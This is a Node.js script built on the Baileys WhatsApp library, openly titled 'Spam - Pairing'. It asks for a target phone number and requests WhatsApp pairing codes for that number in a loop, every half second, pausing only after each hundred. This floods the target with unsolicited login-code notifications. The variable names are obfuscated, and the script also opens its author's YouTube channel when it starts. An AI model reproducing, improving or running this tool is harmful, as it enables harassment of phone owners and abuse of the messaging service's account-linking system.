const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  getAggregateVotesInPollMessage,
  proto
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const pino = require("pino");
const chalk = require("chalk");
const readline = require("readline");
const figlet = require("figlet");
const _ = require("lodash");
const {
  Boom
} = require("@hapi/boom");
const PhoneNumber = require("awesome-phonenumber");
const {
  color
} = require("./lib/color");
const {
  await
} = require("./lib/myfunc");
const open = require("open");
const EventEmitter = require("events");
EventEmitter.defaultMaxListeners = 150;

const question = text => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  return new Promise(resolve => {
    rl.question(text, resolve);
  });
};

const store = makeInMemoryStore({
  logger: pino().child({
    level: "silent",
    stream: "store"
  })
});

console.log(color(figlet.textSync("Spam - Pairing", {
  font: "DOS Rebel",
  horizontalLayout: "default",
  vertivalLayout: "default",
  width: 250,
  whitespaceBreak: false
}), "pink"));

console.log(chalk.white.bold(chalk.green.bold("📃  Informasi :") + "         \n✉️  Script Spam - Pairing \n✉️  Author : PAEDULZ\n✉️  Gmail : paedulzofficial@gmail.com\n✉️  Instagram : https://www.instagram.com/muhammadfaidhulasani\n\n" + chalk.green.bold("Script Dishare Oleh PAEDULZ :D") + "\n"));

async function startBotz(targetNumber) {
  const {
    state: _0x407507,
    saveCreds: _0x3aea4a
  } = await useMultiFileAuthState("PAEDULZ");
  
  const _0x329df5 = makeWASocket({
    logger: pino({
      level: "silent"
    }),
    printQRInTerminal: false,
    auth: _0x407507,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    emitOwnEvents: true,
    fireInitQueries: true,
    generateHighQualityLinkPreview: true,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  
  console.log("Subscribe Youtube Owner...");
  await open("https://youtube.com/@PAEDULZ");
  console.log(" ");
  await new Promise(_0x524c4 => setTimeout(_0x524c4, 10000));
  
  let _0x4dfbbe = false;
  let _0x3553e5 = 0;
  
  const _0x52458f = targetNumber || await question("Masukkan Nomor Bot Target, For Example: 6283857564133 :\n");
  
  if (!_0x329df5.authState.creds.registered) {
    while (!_0x4dfbbe) {
      try {
        let _0x1dabbe = await _0x329df5.requestPairingCode(_0x52458f);
        _0x1dabbe = _0x1dabbe?.match(/.{1,4}/g)?.join("-") || _0x1dabbe;
        console.log(chalk.green.bold("Pairing Code :", _0x1dabbe));
        
        // Kirim pairing code ke stdout untuk ditangkap oleh server
        process.stdout.write(`PAIRING_CODE:${_0x1dabbe}\n`);
        
        _0x3553e5++;
        if (_0x3553e5 >= 100) {
          console.log(chalk.yellow.bold("Sudah mengirim 100 kode, menunggu 30 detik sebelum melanjutkan..."));
          await new Promise(_0xf913df => setTimeout(_0xf913df, 30000));
          _0x3553e5 = 0;
        }
        
        await new Promise(_0x528341 => {
          const _0x20efac = setTimeout(() => {
            if (!_0x4dfbbe) {
              console.log(chalk.white.bold("Mengirim Ulang Code"));
              _0x528341();
            }
          }, 500);
          
          _0x329df5.ev.on("connection.update", _0x4947d0 => {
            if (_0x4947d0.connection === "open") {
              _0x4dfbbe = true;
              clearTimeout(_0x20efac);
              console.log("Berhasil terhubung!");
              _0x528341();
            }
          });
        });
      } catch (_0x34d7ae) {
        console.log(chalk.red.bold("Error generating pairing code: " + _0x34d7ae));
        console.log(chalk.yellow.bold("Menunggu 10 detik sebelum mencoba lagi..."));
        await new Promise(_0x413e73 => setTimeout(_0x413e73, 10000));
      }
    }
  }
  
  store.bind(_0x329df5.ev);
  
  _0x329df5.ev.on("connection.update", async _0x416842 => {
    const {
      connection: _0x40c909,
      lastDisconnect: _0x10ee84
    } = _0x416842;
    
    if (_0x40c909 === "close") {
      let _0x4d0b14 = new Boom(_0x10ee84?.error)?.output.statusCode;
      if (_0x4d0b14 === DisconnectReason.badSession || _0x4d0b14 === DisconnectReason.connectionClosed || _0x4d0b14 === DisconnectReason.connectionLost || _0x4d0b14 === DisconnectReason.connectionReplaced || _0x4d0b14 === DisconnectReason.restartRequired || _0x4d0b14 === DisconnectReason.timedOut) {
        console.log("Koneksi ditutup, mencoba kembali...");
        startBotz(_0x52458f);
      }
    } else if (_0x40c909 === "open") {
      console.log("[Connected] " + JSON.stringify(_0x329df5.user.id, null, 2));
    }
  });
  
  _0x329df5.ev.on("creds.update", _0x3aea4a);
  return _0x329df5;
}

// Jalankan dengan argumen dari command line
const targetNumber = process.argv[2];
startBotz(targetNumber);

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});